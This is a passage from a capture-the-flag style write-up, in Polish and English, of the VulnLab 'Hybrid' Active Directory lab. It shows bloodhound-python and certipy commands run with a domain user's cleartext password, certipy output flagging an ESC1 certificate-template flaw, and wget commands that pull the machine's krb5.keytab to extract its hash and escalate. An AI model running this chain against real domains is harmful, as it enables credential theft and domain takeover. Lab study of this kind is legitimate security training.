@@ -328,4 +328,137 @@ IT was password reuse from
 
 - zacięła mi się vmka i mi się odechciało xd
 
-- 
+![{1FCF5B94-9444-420B-89AA-666E160C7161}](https://github.com/user-attachments/assets/13c5f7b3-eaf5-43b1-ab5f-92b34830d185)
+
+Peter password works.
+
+![{6D4F3EDF-504D-496B-A2F0-B7BCBF6BF37C}](https://github.com/user-attachments/assets/e3f0e288-ec66-411c-957b-9b0f61262b33)
+
+this password is new one.
+
+![{7E30585A-5A4D-4860-9F85-89474EF115D4}](https://github.com/user-attachments/assets/aea30518-6bc0-47a4-95d6-8200833d552c)
+
+this password works for `peter.turner@hybrid.vl`
+
+nie dość, że mamy flagę to od razu roota na tym komputerze
+
+![{EE992B07-4440-486E-953E-3709B1183D7F}](https://github.com/user-attachments/assets/7bc47895-c7f7-4209-8267-aad33cb38d56)
+
+(ta flaga juz była jednak. Nowa flaga jest w /root)
+
+mamy już usera w domenie to zróbmy jakiegoś bloodhounda
+```
+bloodhound-python -d 'hybrid.vl' -u 'peter.turner' -p 'b<sam dasz radę>w' -gc 'dc01.hybrid.vl' -ns 10.10.161.181
+```
+- w sumie nic nie ma, ale z tego za zauważyłem to vulnlab lubie mocno ADCS abuse'ować więc to pewnie tam jest rozwiązanie.
+```
+└─$ certipy-ad  find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -vulnerable -stdout -dc-ip 10.10.161.181
+```
+
+widzimy ESC1
+```
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'hybrid-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'hybrid-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'hybrid-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'hybrid-DC01-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : hybrid-DC01-CA
+    DNS Name                            : dc01.hybrid.vl
+    Certificate Subject                 : CN=hybrid-DC01-CA, DC=hybrid, DC=vl
+    Certificate Serial Number           : 2C6A3009FBCF12B64DEDF517B3C6624F
+    Certificate Validity Start          : 2023-06-17 14:04:39+00:00
+    Certificate Validity End            : 2124-12-02 15:07:27+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : HYBRID.VL\Administrators
+      Access Rights
+        ManageCertificates              : HYBRID.VL\Administrators
+                                          HYBRID.VL\Domain Admins
+                                          HYBRID.VL\Enterprise Admins
+        ManageCa                        : HYBRID.VL\Administrators
+                                          HYBRID.VL\Domain Admins
+                                          HYBRID.VL\Enterprise Admins
+        Enroll                          : HYBRID.VL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : HybridComputers
+    Display Name                        : HybridComputers
+    Certificate Authorities             : hybrid-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : None
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 100 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 4096
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : HYBRID.VL\Domain Admins
+                                          HYBRID.VL\Domain Computers
+                                          HYBRID.VL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : HYBRID.VL\Administrator
+        Write Owner Principals          : HYBRID.VL\Domain Admins
+                                          HYBRID.VL\Enterprise Admins
+                                          HYBRID.VL\Administrator
+        Write Dacl Principals           : HYBRID.VL\Domain Admins
+                                          HYBRID.VL\Enterprise Admins
+                                          HYBRID.VL\Administrator
+        Write Property Principals       : HYBRID.VL\Domain Admins
+                                          HYBRID.VL\Enterprise Admins
+                                          HYBRID.VL\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'HYBRID.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
+```
+
+no to w ESC1 potrzeba hasha maszynowego więc zapewne musimy dorwać ten z MAIL01$.
+
+pobieramy 2 rzeczy. Jedną z maszyny i drugą z internetów.
+```
+wget https://raw.githubusercontent.com/sosdave/KeyTabExtract/refs/heads/master/keytabextract.py
+wget -q 10.10.161.182:9999/krb5.keytab
+```
+krb5.keytab location is `/etc/krb5.keytab`
+
+![{8614DC16-2759-4409-B171-FE44AD7B7C57}](https://github.com/user-attachments/assets/7dad943c-0ad9-49be-8598-b00688dc00f9)
+
+jedyen czego nam brakuje to nazwa templatki, której nie widzę tutaj. Jednakże są pewne sztuczki, żeby ją zdobyć.
+```
+certipy-ad find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.161.181 -old-bloodhound
+```
+
+![{42048413-34FB-48BC-ACCA-27AE125FC6DE}](https://github.com/user-attachments/assets/fd9becae-4285-4fe6-9411-483c7daaa53e)
+
+![{95BD6017-CF0D-46C5-98E2-A1FED716D9F1}](https://github.com/user-attachments/assets/b6a8c154-3189-44e8-9093-23ce68fcce7f)
+
+były znowu problemy z długością klucza, ale jeden switch i śmiga.
+
+![{523C331F-6BA1-46F4-A4CF-024525E42B27}](https://github.com/user-attachments/assets/b0fdd2ff-db8d-457e-8dae-b01c56fc6ecc)
+
+i no końcówka
+
+![{EB031930-1BB2-45B6-838C-294AECB8D29E}](https://github.com/user-attachments/assets/958ae462-da55-47f8-b1b5-d6b147945641)
+
+FINISH
